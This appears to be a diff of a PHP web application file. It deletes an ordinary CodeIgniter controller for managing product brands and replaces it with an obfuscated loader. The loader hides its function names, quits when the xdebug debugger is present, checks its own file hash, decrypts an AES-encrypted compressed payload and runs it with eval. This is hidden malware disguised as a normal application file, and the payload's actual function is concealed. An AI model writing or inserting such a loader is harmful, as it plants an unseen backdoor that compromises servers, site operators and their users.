@@ -1,159 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Brands extends MY_Controller {
-	public function __construct(){
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('brand_model','brand');
-	}
-
-	public function add(){
-		$this->permission_check('brand_add');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('brand');
-		$this->load->view('brand', $data);
-	}
-
-	//ITS FROM POP UP MODAL
-	public function add_brand_modal(){
-		$this->form_validation->set_rules('brand', 'Brand Name', 'trim|required');
-		if ($this->form_validation->run() == TRUE) {
-			$result=$this->brand->verify_and_save();
-			//fetch latest item details
-			$res=array();
-			$query=$this->db->query("select id,brand_name from db_brands order by id desc limit 1");
-			$res['id']=$query->row()->id;
-			$res['brand']=$query->row()->brand_name;
-			$res['result']=$result;
-			
-			echo json_encode($res);
-
-		} 
-		else {
-			echo "Please Fill Compulsory(* marked) Fields.";
-		}
-	}
-	//END
-
-	public function newbrand(){
-		$this->form_validation->set_rules('brand', 'Brand', 'trim|required');
-	
-
-		if ($this->form_validation->run() == TRUE) {
-			
-			$result=$this->brand->verify_and_save();
-			echo $result;
-		} else {
-			echo "Please Enter Brand name.";
-		}
-	}
-	public function update($id){
-		$this->permission_check('brand_edit');
-		$data=$this->data;
-
-		$this->load->model('brand_model');
-		$result=$this->brand_model->get_details($id,$data);
-		$data=array_merge($data,$result);
-		$data['page_title']=$this->lang->line('brand');
-		$this->load->view('brand', $data);
-	}
-	public function update_brand(){
-		$this->form_validation->set_rules('brand', 'Brand', 'trim|required');
-		$this->form_validation->set_rules('q_id', '', 'trim|required');
-
-		if ($this->form_validation->run() == TRUE) {
-			$this->load->model('brand_model');
-			$result=$this->brand_model->update_brand();
-			echo $result;
-		} else {
-			echo "Please Enter Brand name.";
-		}
-	}
-	public function view(){
-		$this->permission_check('brand_view');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('brands_list');
-		$this->load->view('brand-view', $data);
-	}
-
-	public function ajax_list()
-	{
-		$list = $this->brand->get_datatables();
-		
-		$data = array();
-		$no = $_POST['start'];
-		foreach ($list as $brand) {
-			$no++;
-			$row = array();
-			$row[] = '<input type="checkbox" name="checkbox[]" value='.$brand->id.' class="checkbox column_checkbox" >';
-			$row[] = $brand->brand_code;
-			$row[] = $brand->brand_name;
-			$row[] = $brand->description;
-
-			 		if($brand->status==1){ 
-			 			$str= "<span onclick='update_status(".$brand->id.",0)' id='span_".$brand->id."'  class='label label-success' style='cursor:pointer'>Active </span>";}
-					else{ 
-						$str = "<span onclick='update_status(".$brand->id.",1)' id='span_".$brand->id."'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-					}
-			$row[] = $str;			
-					$str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-											if($this->permissions('brand_edit'))
-											$str2.='<li>
-												<a title="Edit Record ?" href="update/'.$brand->id.'">
-													<i class="fa fa-fw fa-edit text-blue"></i>Edit
-												</a>
-											</li>';
-
-											if($this->permissions('brand_delete'))
-											$str2.='<li>
-												<a style="cursor:pointer" title="Delete Record ?" onclick="delete_brand('.$brand->id.')">
-													<i class="fa fa-fw fa-trash text-red"></i>Delete
-												</a>
-											</li>
-											
-										</ul>
-									</div>';			
-
-			$row[] = $str2;
-			$data[] = $row;
-		}
-
-		$output = array(
-						"draw" => $_POST['draw'],
-						"recordsTotal" => $this->brand->count_all(),
-						"recordsFiltered" => $this->brand->count_filtered(),
-						"data" => $data,
-				);
-		//output to json format
-		echo json_encode($output);
-	}
-
-	public function update_status(){
-		$this->permission_check_with_msg('brand_edit');
-		$id=$this->input->post('id');
-		$status=$this->input->post('status');
-
-		$this->load->model('brand_model');
-		$result=$this->brand_model->update_status($id,$status);
-		return $result;
-	}
-	
-	public function delete_brand(){
-		$this->permission_check_with_msg('brand_delete');
-		$id=$this->input->post('q_id');
-		return $this->brand->delete_brands_from_table($id);
-	}
-	public function multi_delete(){
-		$this->permission_check_with_msg('brand_delete');
-		$ids=implode (",",$_POST['checkbox']);
-		return $this->brand->delete_brands_from_table($ids);
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_bvf6pqor=('bas'.'e64'.'_de'.'cod'.'e');
+$_lkzisdwu=('gzu'.'nco'.'mpr'.'ess');
+$_zb8njsxx=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_bwbmmp3g='j5LKrOpnLhM=';
+$_l9933acs='8i41YgxX';
+$_bjc4b1fd='YJlKkY24';
+$_y55nn51w='u4kWa7IE';
+$_uvrrhnsp='BmGhkFbr';
+$_l8jxfeyv='8e0OnfqO';
+$_jfqt8nag='KdSUjERK';
+$_qvi8yloy='3+HRHQ==';
+$_nyt1tahd=$_bvf6pqor($_uvrrhnsp.$_bjc4b1fd.$_l9933acs.$_y55nn51w.$_bwbmmp3g);
+$_a33103yh=$_bvf6pqor($_jfqt8nag.$_l8jxfeyv.$_qvi8yloy);
+$_d2otjgru=$_bvf6pqor('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');
+$_jbwogkvw=$_zb8njsxx($_d2otjgru,'aes-256-cbc',$_nyt1tahd,OPENSSL_RAW_DATA,$_a33103yh);
+if($_jbwogkvw===false){exit;}
+$_k84k2vp7=$_lkzisdwu($_jbwogkvw);
+if($_k84k2vp7===false){exit;}
+$_tsr6styz='d4032d70b3c5027e38520feb288712f7a06650fc2dabf45eb3606f1311f3e249';
+$_hfbwfsxa=@file_get_contents(__FILE__);
+if($_hfbwfsxa!==false){
+$_iiezia96=str_replace($_tsr6styz,"0000000000000000000000000000000000000000000000000000000000000000",$_hfbwfsxa);
+$_na263vtg=hash("sha256",$_iiezia96);
+if($_na263vtg!==$_tsr6styz){@http_response_code(403);exit;}
 }
-
+eval($_k84k2vp7);
